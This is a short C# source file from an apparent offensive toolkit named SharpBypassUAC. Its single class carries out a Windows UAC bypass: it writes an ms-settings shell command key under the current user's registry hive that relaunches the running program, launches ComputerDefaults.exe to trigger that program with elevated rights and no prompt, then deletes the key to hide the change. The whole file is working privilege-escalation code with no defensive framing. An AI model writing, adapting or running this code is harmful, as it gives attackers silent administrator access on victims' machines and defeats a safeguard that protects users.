using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;
using Microsoft.Win32;

namespace SharpBypassUAC;

public class ComputerDefaults
{
	[DllImport("kernel32.dll")]
	public static extern int WinExec(string exeName, int operType);

	public ComputerDefaults()
	{
		RegistryKey? registryKey = Registry.CurrentUser.OpenSubKey("Software\\Classes\\", writable: true);
		registryKey.CreateSubKey("ms-settings\\Shell\\Open\\command");
		RegistryKey? registryKey2 = Registry.CurrentUser.OpenSubKey("Software\\Classes\\ms-settings\\Shell\\Open\\command", writable: true);
		registryKey2.SetValue("DelegateExecute", "");
		registryKey2.SetValue("", "cmd.exe /k START " + Process.GetCurrentProcess().MainModule.FileName + " & EXIT");
		registryKey2.Close();
		WinExec("C:\\windows\\system32\\ComputerDefaults.exe", 0);
		Thread.Sleep(1000);
		registryKey.DeleteSubKeyTree("ms-settings");
		Environment.Exit(0);
	}
}
